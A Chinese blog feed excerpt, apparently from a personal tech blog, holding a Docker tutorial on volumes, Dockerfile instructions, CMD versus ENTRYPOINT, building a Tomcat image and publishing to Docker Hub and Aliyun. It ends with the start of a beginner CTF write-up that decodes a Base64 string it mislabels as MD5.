<p>我们通过具名挂在可以方便的找 到我们的一个卷，大多数情况下在使用的<code>具名挂载</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 区分具名挂载和匿名挂载，还有指定挂载</span></span><br><span class="line">-v 容器内路径		# 匿名挂载</span><br><span class="line">-v 卷名:容器内路径		# 具名挂载</span><br><span class="line">-v /宿主机路径:容器内路径		# 指定挂载</span><br></pre></td></tr></table></figure>

<p>扩展：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 通过 -v 容器内路径：ro、rw 改变读写权限</span></span><br><span class="line">ro	readonly	# 只读</span><br><span class="line">rw	readwrite	# 可读可写</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 一旦设定了容器权限，容器对我们挂载出来的内容就有限定了</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker run -d -P --name nginx02 -v long-nginx:/etc/nginx:ro nginx</span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home# docker run -d -P --name nginx02 -v long-nginx:/etc/nginx:rw nginx</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> ro 只要看到ro就说明这个路径只能通过宿主机来操作，容器内部是无法操作</span></span><br></pre></td></tr></table></figure>

<h4 id="初识DockerFile"><a href="#初识DockerFile" class="headerlink" title="初识DockerFile"></a>初识DockerFile</h4><p>dockerfile就是用来构建docker 镜像的构建文件！命令脚本！</p>
<p>通过这个脚本可以生成镜像，镜像是一层一层的，脚本就是一个一个的命令，每个命令都是一层！</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 创建一个dockerfile文件，名字可以随机 建议 Dockerfile</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 文件中内容 指令（大写） 参数</span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">VOLUME ["volume01","volume02"]</span><br><span class="line"></span><br><span class="line">CMD echo "----end----"</span><br><span class="line"></span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 这里的每一个命令，就是镜像的一层</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710164902856.png" alt="image-20200710164902856"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动自己写的容器</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710173957881.png" alt="image-20200710173957881"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710173710647.png" alt="image-20200710173710647"></p>
<p>这个卷和外部一定有一个同步的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710170549879.png" alt="image-20200710170549879"></p>
<p>进入我们的刚才自动生成的数据卷目录，新建一个文件</p>
<p>可以看到这个centos是个阉割版的clear都用不了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710174153216.png" alt="image-20200710174153216"></p>
<p>新建一个新的窗口，查看一下容器信息</p>
<p>正在运行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710174437653.png" alt="image-20200710174437653"></p>
<p>查看一下匿名挂载的路径</p>
<p><code>docker inspect 容器ID</code></p>
<p>找到Mounts，找到之前创建文件的volume01路径</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710175231742.png" alt="image-20200710175231742"></p>
<p>复制进入，ls查看，</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200710175251710.png" alt="image-20200710175251710"></p>
<p>这种方法我们是非常常用的，因为我们通常要构造自己的镜像！</p>
<p>假设构建镜像时没有挂载卷，需要手动挂载 -v 卷名:容器内路径</p>
<h4 id="数据卷容器"><a href="#数据卷容器" class="headerlink" title="数据卷容器"></a>数据卷容器</h4><p>多个mysql同步数据</p>
<p>有一个子容器centos02和一个父容器centos01，我们需要要一个容器去挂载父容器，实现数据同步，所以需要centos02跟01实现一个挂载，所以要是用一个命令 <code>--volumes-from</code>通过这个方式就可以跟centos01数据同步上了。</p>
<p>谁去挂载谁称之为父容器，如果centos02一旦挂载了centos01，那么它们两个同步的数据卷内容就是同步的。而被挂载的所谓的父容器，他就叫做<strong>数据卷容器</strong>他有一个容器，但是他有一个挂载的功能，我们可以通过数据卷容器给其他人共享一些内容，或者<strong>两个容器/多个容器</strong>之间实行容器的共享</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711203957148.png" alt="image-20200711203957148"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 启动3个容器，通过我们刚才自己写的镜像启动</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711211315036.png" alt="image-20200711211315036"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 使用该命令将数据卷02挂载到数据卷01实现数据同步</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker run -it --name docker02 --volumes-from docker01 long/centos:1.0</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711212739664.png" alt="image-20200711212739664"></p>
<p>新建一个窗口分别进入容器1和容器2，查看当前地址下的目录</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711212904189.png" alt="image-20200711212904189"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711212938049.png" alt="image-20200711212938049"></p>
<p>在容器1进入volume01，在里面新建一个文件，查看容器2的volume01是否也有该文件</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711213032498.png" alt="image-20200711213032498"></p>
<p>这样成功地返回了容器1中新建的内容，当然如果在创建一个容器3都是一个道理</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711213056453.png" alt="image-20200711213056453"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 删除docker01，查看docker02和03发现还可以访问这个文件</span></span><br></pre></td></tr></table></figure>

<p>这是一种备份机制而不是共享机制，他这里面的概念是拷贝的概念，双向拷贝的概念。</p>
<p>如果将容器1删除了，但是容器2和3已经将里面的共享卷拷贝出来了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200711215345468.png" alt="image-20200711215345468"></p>
<p>多个mysql同步数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~#	docker run -d -p 3310:3306 -v /home/mysql/conf:/etc/mysql/conf.d -v /var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 --name mysql01 mysql:5.7</span><br><span class="line"></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~#	docker run -d -p 3310:3306 -v -e MYSQL_ROOT_PASSWORD=123456 --name mysql02 --volumes-from mysql01 mysql:5.7</span><br><span class="line"><span class="meta">#</span><span class="bash"> 这个时候可以实现两个容器数据同步</span></span><br></pre></td></tr></table></figure>

<p><strong>结论</strong>：</p>
<p>容器之间可以做一些配置信息的传递，数据卷容器的生命周期一只持续到没有容器使用为之。</p>
<p>但是一旦持久化了本地，这个时候，本地的数据是不会删除的</p>
<h4 id="DockerFile介绍"><a href="#DockerFile介绍" class="headerlink" title="DockerFile介绍"></a>DockerFile介绍</h4><p>dockerfile是用来构建docker镜像的文件！命令参数脚本！</p>
<p><strong>构建步骤：</strong></p>
<p>1、编写一个  dockerfile 文件</p>
<p>2、docker build    构建称为一个镜像</p>
<p>3、docker run 运行镜像</p>
<p>4、docker push 发布镜像（DockerHub、阿里云镜像仓库）</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712200018691.png" alt="image-20200712200018691"></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712200244969.png" alt="image-20200712200244969"></p>
<p>很多官方镜像都是基础包，很多功能没有，我们通常会自己搭建自己的镜像！    因为每个人的需求不同，比如我们要加 jdk + tomcat + Mysql + reid。</p>
<p>既然官方可以制作镜像，那么我们也可以</p>
<h4 id="DockerFile构建过程"><a href="#DockerFile构建过程" class="headerlink" title="DockerFile构建过程"></a>DockerFile构建过程</h4><h5 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h5><p>1、每个保留关键字（指令）都是必须是大写字母</p>
<p>2、执行从上到下顺序执行</p>
<p>3、# 表示注释</p>
<p>4、每一个指令都会创建提交一个新的镜像层，并提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712203820415.png" alt="image-20200712203820415"></p>
<p>dockerfile是面向开发的，我们以后要发布项目，做镜像，就需要编写dockerfile文件，这个文件十分简单！</p>
<p>Docker镜像逐渐成为企业交付的标准，必须要掌握！</p>
<p><strong>步骤：</strong></p>
<p>Dockerfile：构建稳健，定义了一切的步骤，源代码</p>
<p>DockerImages：通过DockerFile构建生成的镜像，最终发布和运行的产品</p>
<p>Docker容器：容器就是镜像运行起来提供服务器</p>
<h4 id="DockerFile的指令"><a href="#DockerFile的指令" class="headerlink" title="DockerFile的指令"></a>DockerFile的指令</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM				# 基础镜像，一切从这里开始构建 centos</span><br><span class="line">MAINTAINER			# 镜像是谁写的，姓名 + 邮箱</span><br><span class="line">RUN					# 镜像构建的时候需要运行的命令</span><br><span class="line">ADD					# 步骤，tomcat镜像，这个tomcat！ 添加内容</span><br><span class="line">WORKDIR				# 镜像的工作目录</span><br><span class="line">VOLUME				# 挂载的目录位置</span><br><span class="line">EXPOSE				# 指定暴露端口</span><br><span class="line">CMD					# 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT			# 指定这个容器启动的时候要运行的命令，可以追加命令</span><br><span class="line">ONBUILD				# 当构建一个被继承 DockerFile 这个时候就会运行 ONBUILD 的指令，触发指令</span><br><span class="line">COPY				# 类似ADD，将我们文件拷贝到镜像中</span><br><span class="line">ENV					# 构建的时候设置环境变量</span><br></pre></td></tr></table></figure>

<p>CMD命令和ENTRYPOINT的区别。</p>
<p>例如：在CMD中构造了 ls -a，然后docker run执行了容器，在容器外使用ls -l或者-l的话就会将容器内的 -a替换掉，如果是ENTRYPOINT的话就会在后面追加，ls -a -l 这样。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712205623510.png" alt="image-20200712205623510"></p>
<h5 id="实战测试"><a href="#实战测试" class="headerlink" title="实战测试"></a>实战测试</h5><p>docker hub 中99%的镜像都是从FROM scratch开始的，然后配置需要的软件和配置来进行构建。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712211723345.png" alt="image-20200712211723345"></p>
<blockquote>
<p>创建一个自己的centos</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1、编写dockerfile的文件</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# cat mycentos </span><br><span class="line"></span><br><span class="line">FROM centos</span><br><span class="line">MAINTAINER long&lt;1927353788@qq.ocm&gt;</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">EXPOSE 80</span><br><span class="line"></span><br><span class="line">CMD echo $MYPATH</span><br><span class="line">CMD echo "----end----"</span><br><span class="line">CMD /bin/bash</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 2、通过这个文件构建镜像</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 命令： docker build -f dockerfile的文件路径 -t 镜像名:版本号 .</span></span><br><span class="line">成功返回</span><br><span class="line">Successfully built 789e8d69df33</span><br><span class="line">Successfully tagged mydocker:1.0</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 3、测试运行</span></span><br></pre></td></tr></table></figure>

<p>对比：之前原来的centos</p>
<p>pwd</p>
<p>原centos的工作目录是根目录：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214252421.png" alt="image-20200712214252421"></p>
<p>自己构建的centos我们设置的根目录是/usr/local：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214315005.png" alt="image-20200712214315005"></p>
<p>vim</p>
<p>原centos中的vim命令不能使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214359447.png" alt="image-20200712214359447"></p>
<p>自己构建的centos的vim命令可以使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214508762.png" alt="image-20200712214508762"></p>
<p>ifconfig</p>
<p>原centos的ifconfig命令不能使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214548323.png" alt="image-20200712214548323"></p>
<p>自己构建的centos的ifconfig命令可以使用：</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712214651098.png" alt="image-20200712214651098"></p>
<p>我们可以列出本地本地进行的变更历史</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">docker history 容器ID</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200712215508982.png" alt="image-20200712215508982"></p>
<blockquote>
<p>CMD和 ENTRYPOINT的区别</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">CMD					# 指定这个容器启动的时候要运行的命令，只有最后一个会生效，可被替代</span><br><span class="line">ENTRYPOINT			# 指定这个容器启动的时候要运行的命令，可以追加命令</span><br></pre></td></tr></table></figure>

<p>测试CMD</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写dockerfile 文件</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it mycmd</span><br><span class="line">/bin/sh: [ls.-a]: command not found</span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# vi cmd </span><br><span class="line">FROM centos</span><br><span class="line">CMD ["ls","-a"]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建镜像</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker build -f cmd -t mycmd .</span><br><span class="line"></span><br><span class="line">Sending build context to Docker daemon  3.072kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 831691599b88</span></span><br><span class="line">Step 2/2 : CMD ["ls","-a"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> d8930564e002</span></span><br><span class="line">Removing intermediate container d8930564e002</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> deb7bf9eca04</span></span><br><span class="line">Successfully built deb7bf9eca04</span><br><span class="line">Successfully tagged mycmd:latest</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> run运行，发现我们的ls -a命令生效</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it mycmd</span><br><span class="line">.   .dockerenv  dev  home  lib64       media  opt   root  sbin  sys  usr</span><br><span class="line">..  bin         etc  lib   lost+found  mnt    proc  run   srv   tmp  var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 我们想要追加一个命令 -l 	la-al</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it deb7bf9eca04 -l</span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused "exec: \"-l\": executable file not found in $PATH": unknown.</span><br><span class="line">ERRO[0000] error waiting for container: context canceled </span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> cmd的情况下 -l 替换么CMD [<span class="string">"ls"</span>,<span class="string">"-a"</span>]命令，-l 不是命令所以报错</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将格式后面加上 ls -al才能执行，</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it deb7bf9eca04 ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:03 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:03 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Jul 12 15:03 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  360 Jul 12 15:03 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:03 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 11  2019 home</span><br></pre></td></tr></table></figure>

<p>测试ENTRYPOINT</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编写一个Entrypoint的dockerfile文件</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# vi entrypoint</span><br><span class="line">FROM centos</span><br><span class="line">ENTRYPOINT ["ls","-a"]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 构建镜像</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker build -f entrypoint -t myentrypoint .</span><br><span class="line">Sending build context to Docker daemon  4.096kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 831691599b88</span></span><br><span class="line">Step 2/2 : ENTRYPOINT ["ls","-a"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 68d1dab6df2f</span></span><br><span class="line">Removing intermediate container 68d1dab6df2f</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 4a4072bdbcc6</span></span><br><span class="line">Successfully built 4a4072bdbcc6</span><br><span class="line">Successfully tagged myentrypoint:latest</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 运行镜像</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it 4a4072bdbcc6</span><br><span class="line">.   .dockerenv  dev  home  lib64       media  opt   root  sbin  sys  usr</span><br><span class="line">..  bin         etc  lib   lost+found  mnt    proc  run   srv   tmp  var</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 加上参数，发现直接运行了，说明参数追加了，并不是像CMD一样报错</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/dockerfile# docker run -it 4a4072bdbcc6 -l</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:06 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:06 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Jul 12 15:06 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 May 11  2019 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  360 Jul 12 15:06 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Jul 12 15:06 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 May 11  2019 home</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h5 id="实战：tomcat镜像"><a href="#实战：tomcat镜像" class="headerlink" title="实战：tomcat镜像"></a>实战：tomcat镜像</h5><p>1、准备镜像文件 tomcat 压缩包，jdk的压缩包！</p>
<p>百度搜索下载就行</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713141438888.png" alt="image-20200713141438888"></p>
<p>2、编写dockerfile文件，官方命名<code>Dockerfile</code>，build会自动寻找这个文件，就不需要-f指定了！</p>
<p>新建一个readme.txt，在vim Dockerfile</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">FROM centos</span><br><span class="line">MAINTAINER long&lt;1927353788@qq.com</span><br><span class="line"></span><br><span class="line">COPY readme.txt /usr/local/readme.txt</span><br><span class="line"></span><br><span class="line">ADD jdk-8u60-linux-x64.tar.gz /usr/local/</span><br><span class="line">ADD apache-tomcat-9.0.37.tar.gz /usr/local/</span><br><span class="line"></span><br><span class="line">RUN yum -y install vim</span><br><span class="line">RUN yum -y install net-tools</span><br><span class="line"></span><br><span class="line">ENV MYPATH /usr/local</span><br><span class="line">WORKDIR $MYPATH</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> java安装目录</span></span><br><span class="line">ENV JAVA_HOME /usr/local/jdk1.8.0_60</span><br><span class="line">ENV CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="meta">#</span><span class="bash"> tomcat默认目录</span></span><br><span class="line">ENV CATALINA_HOME /usr/local/apache-tomcat-9.0.37</span><br><span class="line">ENV CATALINA_BASH /usr/local/apache-tomcat-9.0.37</span><br><span class="line">ENV PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line">EXPOSE 8080</span><br><span class="line"></span><br><span class="line">CMD /usr/local/apache-tomcat-9.0.37/bin/startup.sh &amp;&amp; tail -F /usr/local/apache-tomcat-9.0.37/bin/logs/catalina.out</span><br></pre></td></tr></table></figure>

<p>3、构建镜像</p>
<p>因为Dockerfile名字是官方名字，所以我们不需要写-f了</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> docker build -t diytomcat .</span></span><br></pre></td></tr></table></figure>

<p>4、启动镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:/home/tomcat# docker run -d -p 9090:8080 --name longtomcat -v /home/tomcat/test:/usr/local/apache-tomcat-9.0.37/webapps/test -v /home/tomcat/tomcatlogs/:/usr/local/apache-tomcat-9.0.37/logs diytomcat</span><br></pre></td></tr></table></figure>

<p>使用命令<code>curl localhost:9090</code>测试看看是否能返回源码，如果返回说明成功</p>
<p>5、访问测试</p>
<p>直接在页面输入公网地址测试/test/，因为我们之前是配置的test </p>
<p>6、发布项目（由于做了卷挂载，我们直接在本地编写项目皆可以）</p>
<p>xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">  &lt;web-app xmlns="http://java.sun.com/xml/ns/javaee"</span><br><span class="line">           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"</span><br><span class="line">           xsi:schemaLocation="http://java.sun.com/xml/ns/javaee</span><br><span class="line">                               http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"</span><br><span class="line">           version="2.5"&gt;</span><br><span class="line"></span><br><span class="line">  &lt;/web-app&gt;</span><br></pre></td></tr></table></figure>

<p>jsp</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language="java" contentType="text/html; charset=UTF-8"</span><br><span class="line">    pageEncoding="UTF-8"%&gt;</span><br><span class="line">    &lt;!DOCTYPE html&gt;</span><br><span class="line">    &lt;html&gt;</span><br><span class="line">            &lt;head&gt;</span><br><span class="line">                    &lt;meta charset="utf-8"&gt;</span><br><span class="line">                    &lt;title&gt;hello,long &lt;/title&gt;</span><br><span class="line">            &lt;/head&gt;</span><br><span class="line">            &lt;body&gt;</span><br><span class="line">                    Hello World!&lt;br/&gt;</span><br><span class="line">                    &lt;%</span><br><span class="line">                    System.out.println("---- my test web logs ----");</span><br><span class="line">                    %&gt;</span><br><span class="line">                    &lt;/body&gt;</span><br><span class="line">            &lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>发现：项目部署成功，可以直接访问ok</p>
<h4 id="发布镜像"><a href="#发布镜像" class="headerlink" title="发布镜像"></a>发布镜像</h4><blockquote>
<p>Docker Hub</p>
</blockquote>
<p>1、地址：<a href="https://hub.docker.com/" target="_blank" rel="noopener">https://hub.docker.com/</a>   注册自己的账号</p>
<p>2、确定账号可以登录</p>
<p>3、在我们服务器上提交自己的镜像</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker login --help</span><br><span class="line"></span><br><span class="line">Usage:  docker login [OPTIONS] [SERVER]</span><br><span class="line"></span><br><span class="line">Log in to a Docker registry.</span><br><span class="line">If no server is specified, the default is defined by the daemon.</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  -p, --password string   Password</span><br><span class="line">      --password-stdin    Take the password from stdin</span><br><span class="line">  -u, --username string   Username</span><br><span class="line">  </span><br><span class="line"> </span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker login -u t4rb</span><br><span class="line">Password: </span><br><span class="line">WARNING! Your password will be stored unencrypted in /root/.docker/config.json.</span><br><span class="line">Configure a credential helper to remove this warning. See</span><br><span class="line">https://docs.docker.com/engine/reference/commandline/login/#credentials-store</span><br><span class="line"></span><br><span class="line">Login Succeeded</span><br></pre></td></tr></table></figure>

<p>4、登陆完毕后就可以提交镜像了。使用<code>docker push</code>命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> push自己的镜像到服务器上，TAG是latest使用docker tag进行更改</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push diytomcat</span><br><span class="line">The push refers to repository [docker.io/library/diytomcat]</span><br><span class="line">8224c93eb99b: Preparing </span><br><span class="line">d84326805ba8: Preparing </span><br><span class="line">bb62c18f4698: Preparing </span><br><span class="line">661cc4178d6d: Preparing </span><br><span class="line">e1c4fa244dba: Preparing </span><br><span class="line">eb29745b8228: Waiting </span><br><span class="line">denied: requested access to the resource is denied  #被拒绝了</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> push镜像问题，这是因为该镜像的TAG是latest</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push t4rb/diytomcat:2.0</span><br><span class="line">The push refers to repository [docker.io/t4rb/diytomcat]</span><br><span class="line">An image does not exist locally with the tag: t4rb/diytomcat</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改完可以看到多了一个镜像，并且TAG变成了1.0</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker images</span><br><span class="line">REPOSITORY           TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">diytomcat            latest              ee410e9aa82d        4 hours ago         676MB</span><br><span class="line">t4rb/tomcat          1.0                 ee410e9aa82d        4 hours ago         676MB</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 更改完成再次进行push，这样就可以成功提交了</span></span><br><span class="line">root@iZ2zeb24c7i2ydyvoyobm2Z:~# docker push t4rb/tomcat</span><br><span class="line">The push refers to repository [docker.io/t4rb/tomcat]</span><br><span class="line">8224c93eb99b: Pushing  1.212MB/22.76MB</span><br><span class="line">d84326805ba8: Pushing  1.664MB/57.2MB</span><br><span class="line">bb62c18f4698: Pushing  703.5kB/15.63MB</span><br><span class="line">661cc4178d6d: Pushing  1.077MB/364.8MB</span><br><span class="line">e1c4fa244dba: Pushed </span><br><span class="line">eb29745b8228: Pushing  544.8kB/215.3MB</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713192056253.png" alt="image-20200713192056253"></p>
<p>提交的时候也是按照层级来提交的</p>
<blockquote>
<p>Docker 发布到阿里云服务上</p>
</blockquote>
<p>1、登录阿里云</p>
<p>2、找到容器镜像服务</p>
<p>3、点击容器仓库，创建命名空间</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713192809151.png" alt="image-20200713192809151"></p>
<p>4、创建容器镜像</p>
<p>要选择本地</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713193008683.png" alt="image-20200713193008683"></p>
<p>5、浏览阿里云</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713193352652.png" alt="image-20200713193352652"></p>
<h5 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h5><p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200713202200623.png" alt="image-20200713202200623"></p>
]]></content>
  </entry>
  <entry>
    <title>bugku</title>
    <url>/2020/07/25/bugku/</url>
    <content><![CDATA[<h4 id="MD5解密"><a href="#MD5解密" class="headerlink" title="MD5解密"></a>MD5解密</h4><p>复制TVRjMU9UYz0=</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211239471.png" alt="image-20200414211239471"></p>
<p>进行MD5解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211307516.png" alt="image-20200414211307516"></p>
<p>复制MTc1OTc=再次进行解密</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211328587.png" alt="image-20200414211328587"></p>
<p>复制这5位数，填入输入框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414211353175.png" alt="image-20200414211353175"></p>
<h4 id="输入长度限制"><a href="#输入长度限制" class="headerlink" title="输入长度限制"></a>输入长度限制</h4><p>只能输入一个字符</p>
